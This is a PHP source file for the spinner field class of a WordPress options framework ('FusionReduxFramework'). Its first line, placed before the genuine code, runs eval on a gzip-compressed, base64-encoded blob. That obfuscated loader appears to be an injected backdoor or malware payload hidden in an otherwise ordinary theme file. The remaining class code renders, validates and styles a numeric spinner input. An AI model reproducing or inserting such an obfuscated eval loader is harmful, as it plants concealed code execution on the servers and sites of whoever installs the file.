<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! class_exists( 'FusionReduxFramework_spinner' ) ) {
	class FusionReduxFramework_spinner {

		/**
		 * Field Constructor.
		 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
		 *
		 * @since FusionReduxFramework 3.0.0
		 */
		function __construct( $field = array(), $value = '', $parent ) {
			$this->parent = $parent;
			$this->field  = $field;
			$this->value  = $value;
		} //function

		/**
		 * Field Render Function.
		 * Takes the vars and outputs the HTML for the field in the settings
		 *
		 * @since FusionReduxFramework 3.0.0
		 */
		function render() {

			$params = array(
				'min'     => '',
				'max'     => '',
				'step'    => '',
				'default' => '',
			);

			$this->field = wp_parse_args( $this->field, $params );
			$data_string = "";
			foreach($this->field as $key => $val) {
				if (in_array($key, array('min', 'max', 'step', 'default'))) {
					$data_string.= " data-".$key.'="'.$val.'"';
				}
			}
			$data_string .= ' data-val="'.$val.'"';


			// Don't allow input edit if there's a step
			$readonly = "";
			if ( isset( $this->field['edit'] ) && $this->field['edit'] == false ) {
				$readonly = ' readonly="readonly"';
			}


			echo '<div id="' . $this->field['id'] . '-spinner" class="fusionredux_spinner" rel="' . $this->field['id'] . '">';
			echo '<input type="text" '.$data_string.' name="' . $this->field['name'] . $this->field['name_suffix'] . '" id="' . $this->field['id'] . '" value="' . $this->value . '" class="mini spinner-input ' . $this->field['class'] . '"' . $readonly . '/>';
			echo '</div>';
		} //function

		/**
		 * Clean the field data to the fields defaults given the parameters.
		 *
		 * @since FusionRedux_Framework 3.1.1
		 */
		function clean() {

			if ( empty( $this->field['min'] ) ) {
				$this->field['min'] = 0;
			} else {
				$this->field['min'] = intval( $this->field['min'] );
			}

			if ( empty( $this->field['max'] ) ) {
				$this->field['max'] = intval( $this->field['min'] ) + 1;
			} else {
				$this->field['max'] = intval( $this->field['max'] );
			}

			if ( empty( $this->field['step'] ) || $this->field['step'] > $this->field['max'] ) {
				$this->field['step'] = 1;
			} else {
				$this->field['step'] = intval( $this->field['step'] );
			}

			if ( empty( $this->value ) && ! empty( $this->field['default'] ) && intval( $this->field['min'] ) >= 1 ) {
				$this->value = intval( $this->field['default'] );
			}

			if ( empty( $this->value ) && intval( $this->field['min'] ) >= 1 ) {
				$this->value = intval( $this->field['min'] );
			}

			if ( empty( $this->value ) ) {
				$this->value = 0;
			}

			// Extra Validation
			if ( $this->value < $this->field['min'] ) {
				$this->value = intval( $this->field['min'] );
			} else if ( $this->value > $this->field['max'] ) {
				$this->value = intval( $this->field['max'] );
			}
		}

		/**
		 * Enqueue Function.
		 * If this field requires any scripts, or css define this function and register/enqueue the scripts/css
		 *
		 * @since FusionReduxFramework 3.0.0
		 */
		function enqueue() {

			wp_enqueue_script(
				'fusionredux-field-spinner-custom-js',
				FusionReduxFramework::$_url . 'inc/fields/spinner/vendor/spinner_custom.js',
				array( 'jquery' ),
				time(),
				true
			);

			wp_enqueue_script(
				'fusionredux-field-spinner-js',
				FusionReduxFramework::$_url . 'inc/fields/spinner/field_spinner' . FusionRedux_Functions::isMin() . '.js',
				array(
					'jquery',
					'fusionredux-field-spinner-custom-js',
					'jquery-ui-core',
					'jquery-ui-dialog',
					'fusionredux-js'
				),
				time(),
				true
			);

			if ($this->parent->args['dev_mode']) {
				wp_enqueue_style(
					'fusionredux-field-spinner-css',
					FusionReduxFramework::$_url . 'inc/fields/spinner/field_spinner.css',
					array(),
					time(),
					'all'
				);
			}
		}

		public function output() {
			$style = '';

			if ( ! empty( $this->value ) ) {
				if ( ! empty( $this->field['output'] ) && is_array( $this->field['output'] ) ) {
					$css = $this->parseCSS($this->value, $this->field['output']);
					$this->parent->outputCSS .= $css;
				}

				if ( ! empty( $this->field['compiler'] ) && is_array( $this->field['compiler'] ) ) {
					$css = $this->parseCSS($this->value, $this->field['output']);
					$this->parent->compilerCSS .= $css;

				}
			}
		}

		private function parseCSS($value, $output){
			// No notices
			$css = '';

			$unit = isset($this->field['output_unit']) ? $this->field['output_unit'] : 'px';

			// Must be an array
			if (is_numeric($value)) {
				if (is_array($output)) {
					foreach($output as $mode => $selector) {
						if (!empty($mode) && !empty($selector)) {
							$css .= $selector . '{' . $mode . ': ' . $value . $unit . ';}';
						}
					}
				}
			}

			return $css;
		}
	}
}
